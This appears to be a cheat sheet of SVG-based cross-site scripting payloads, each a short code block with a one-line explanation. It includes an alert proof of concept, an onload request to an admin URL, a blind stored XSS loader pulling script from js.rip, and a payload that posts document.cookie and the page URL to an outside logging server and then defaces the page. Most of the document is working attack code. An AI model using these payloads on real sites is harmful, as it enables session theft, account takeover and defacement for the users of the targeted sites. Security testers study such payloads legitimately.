```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" >
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(document.domain);
   </script>
</svg>
```
- When the file is displayed in a browser that supports JavaScript, a pop-up box appears showing the domain name of the website.

---

```html
<svg onload="
    var req = new XMLHttpRequest();     <!-- Send XMLHttpRequest request -->
    req.open('GET', 'https://example.com/admin', false);     <!-- Open this URL -->
    req.setRequestHeader('Upgrade-Insecure-Requests', '1');     <!-- Set Upgrade-Insecure-Requests header -->
    req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36');     <!-- Set a random User-Agent header -->
    req.send(null);     <!-- Send the request to https://example.com/admin -->
    var headers = req.response.toLowerCase();    <!-- Displaying the response and converting it to lowercase -->
    console.log(headers);     <!-- Print the results -->
" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve" height="100px" width="100px">
    <g>
        <path d="M28.1,36.6c4.6,1.9,12.2,1.6,20.9,1.1c8.9-0.4,19-0.9,28.9,0.9..."/>
        <path d="M70.3,9.8C57.5,3.4,42.8,3.6,30.5,9.5c-3,6-8.4,19.6-5.3,24.9..."/>
    </g>
</svg>
```
- If the URL the request is directed to contains sensitive data, it could result in the disclosure of critical information.

---

```html
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96 105">
<html>
<head>
<title>PoC</title>
</head>
<body>
<script src="https://js.rip/YOUR-CHANNEL"></script>
</body>
</html>
</svg>
```
- Blind stored XSS.

---

```html
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      alert('Advanced XSS Test Executed!');
      console.log('Cookies:', document.cookie);
      fetch('https://your-test-server.com/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookies: document.cookie, url: window.location.href })
      });
      document.body.innerHTML = '<h1 style="color: red;">XSS Test Successful!</h1>';
    });
  </script>
</svg>
```
- It is used to send a POST request to the URL https://your-test-server.com/log.
		The following data is sent to the server:
- Cookies: Accessed using document.cookie.
- Current URL: Obtained using window.location.href.
- The entire page content is replaced with a large heading (H1) containing the text "XSS Test Successful!" in red color.
- 
